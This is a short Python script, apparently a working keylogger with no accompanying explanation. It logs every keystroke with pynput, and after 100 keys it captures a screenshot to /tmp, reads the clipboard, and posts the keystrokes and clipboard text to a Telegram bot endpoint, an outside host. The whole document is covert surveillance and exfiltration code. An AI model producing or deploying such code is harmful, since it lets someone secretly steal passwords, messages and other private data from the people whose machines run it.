
from pynput import keyboard
import pyautogui, pyperclip, requests

log = []
def on_press(key):
    log.append(str(key))
    if len(log) > 100:
        screenshot = pyautogui.screenshot()
        screenshot.save("/tmp/screen.png")
        clipboard = pyperclip.paste()
        requests.post("https://api.telegram.org/bot123/sendMessage",
                      data={"text": "Keys: " + "".join(log) + " Clip: " + clipboard})
        log.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
